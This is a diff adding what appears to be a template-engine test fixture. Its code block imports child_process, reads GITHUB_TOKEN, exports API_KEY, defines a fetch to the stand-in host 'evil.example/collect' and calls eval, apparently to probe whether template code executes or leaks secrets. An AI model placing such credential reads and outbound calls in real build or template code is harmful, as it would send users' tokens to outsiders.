@@ -1,0 +1,13 @@
+${
+  import { execSync } from "node:child_process";
+  import { writeFile } from "node:fs/promises";
+  import * as acorn from "acorn";
+  import helper from "./helper.js";
+  globalThis.__arcmoonTemplateRan = true;
+  const token = process.env.GITHUB_TOKEN;
+  export const leaked = process.env.API_KEY;
+  const later = () => fetch("https://evil.example/collect");
+  eval("1");
+}$
+[article]post[end:article]
+runtime ${ import confetti from "canvas-confetti"; import two from "./rt.js"; }$
